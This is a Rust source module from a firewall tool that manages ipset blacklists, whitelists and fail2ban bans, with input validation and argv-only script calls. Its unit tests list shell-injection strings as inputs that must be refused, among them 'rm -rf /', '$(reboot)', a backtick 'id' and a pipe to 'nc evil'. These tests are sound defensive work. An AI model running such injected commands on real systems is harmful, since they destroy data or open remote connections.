//! Permanent firewall state: ipset blacklist, whitelist, fail2ban.
//!
//! This is the *operator-owned* layer. NIMBUSA SHIELD's automatic rules live in
//! a completely separate chain and ipset (see `shield::mitigate`), so an
//! automatic response can never rewrite or lose what an administrator put here.
//!
//! Every value that reaches the helper script is validated first, and the
//! script is invoked with an explicit argv, never through a shell string.
use crate::paths;
use crate::util::{have, run, run_status, valid_domain, valid_ip, valid_ip_or_cidr};
use std::collections::HashSet;

fn fw(args: &[&str]) -> String {
    let script = paths::firewall_script();
    let mut argv: Vec<&str> = vec![&script];
    argv.extend_from_slice(args);
    run("bash", &argv)
}

/// Accept an IP, a CIDR, or a hostname — and nothing else.
fn valid_target(x: &str) -> bool {
    valid_ip_or_cidr(x) || valid_domain(x)
}

pub fn blacklist_list() -> Vec<String> {
    fw(&["list"])
        .lines()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

pub fn blacklist_add(x: &str) -> String {
    if !valid_target(x) {
        return format!("refused: '{}' is not a valid IP, CIDR or hostname", x);
    }
    fw(&["add", x])
}

pub fn blacklist_del(x: &str) -> String {
    if !valid_target(x) {
        return format!("refused: '{}' is not a valid IP, CIDR or hostname", x);
    }
    fw(&["del", x])
}

pub fn whitelist_list() -> Vec<String> {
    fw(&["whitelist", "list"])
        .lines()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty() && !s.starts_with('('))
        .collect()
}

pub fn whitelist_add(x: &str) -> String {
    if !valid_target(x) {
        return format!("refused: '{}' is not a valid IP, CIDR or hostname", x);
    }
    fw(&["whitelist", "add", x])
}

pub fn whitelist_del(x: &str) -> String {
    if !valid_target(x) {
        return format!("refused: '{}' is not a valid IP, CIDR or hostname", x);
    }
    fw(&["whitelist", "del", x])
}

pub fn is_whitelisted(ip: &str) -> bool {
    whitelist_list().iter().any(|w| w == ip)
}

// ------------------------------------------------------------------ fail2ban
pub fn f2b_jails() -> Vec<String> {
    if !have("fail2ban-client") {
        return vec![];
    }
    run("fail2ban-client", &["status"])
        .lines()
        .find(|l| l.contains("Jail list:"))
        .map(|l| {
            l.split(':')
                .nth(1)
                .unwrap_or("")
                .split(',')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect()
        })
        .unwrap_or_default()
}

pub fn f2b_banned() -> HashSet<String> {
    let mut set = HashSet::new();
    for j in f2b_jails() {
        let out = run("fail2ban-client", &["status", &j]);
        if let Some(l) = out.lines().find(|l| l.contains("Banned IP list:")) {
            for ip in l.split(':').nth(1).unwrap_or("").split_whitespace() {
                set.insert(ip.to_string());
            }
        }
    }
    set
}

pub fn f2b_count() -> usize {
    f2b_banned().len()
}

pub fn ban(ip: &str) -> String {
    match valid_ip(ip) {
        None => format!("refused: '{}' is not a valid IP", ip),
        Some(ip) => {
            if is_whitelisted(&ip) {
                return format!("refused: {} is WHITELISTED", ip);
            }
            let (ok, out) = run_status("fail2ban-client", &["set", "sshd", "banip", &ip]);
            if ok {
                format!("banned {}", ip)
            } else {
                format!("ban failed: {}", out)
            }
        }
    }
}

pub fn unban(ip: &str) -> String {
    match valid_ip(ip) {
        None => format!("refused: '{}' is not a valid IP", ip),
        Some(ip) => {
            run("fail2ban-client", &["set", "sshd", "unbanip", &ip]);
            format!("unbanned {}", ip)
        }
    }
}

pub fn whois_ip(ip: &str) -> String {
    if valid_ip(ip).is_none() || !have("whois") {
        return String::new();
    }
    run("whois", &[ip])
        .lines()
        .filter(|l| {
            let lc = l.to_lowercase();
            lc.starts_with("country")
                || lc.contains("orgname")
                || lc.starts_with("netname")
                || lc.starts_with("descr")
                || lc.starts_with("inetnum")
        })
        .take(8)
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_real_targets_are_accepted() {
        assert!(valid_target("1.2.3.4"));
        assert!(valid_target("10.0.0.0/8"));
        assert!(valid_target("bad.example.com"));
        assert!(!valid_target("1.2.3.4; rm -rf /"));
        assert!(!valid_target("$(reboot)"));
        assert!(!valid_target(""));
    }

    #[test]
    fn injection_attempts_are_refused_before_reaching_the_script() {
        for bad in ["1.2.3.4 && reboot", "`id`", "a.com|nc evil 1", "--help"] {
            assert!(blacklist_add(bad).starts_with("refused:"), "{}", bad);
            assert!(whitelist_add(bad).starts_with("refused:"), "{}", bad);
            assert!(blacklist_del(bad).starts_with("refused:"), "{}", bad);
        }
        assert!(ban("not-an-ip").starts_with("refused:"));
        assert!(unban("1.2.3.4.5").starts_with("refused:"));
    }
}
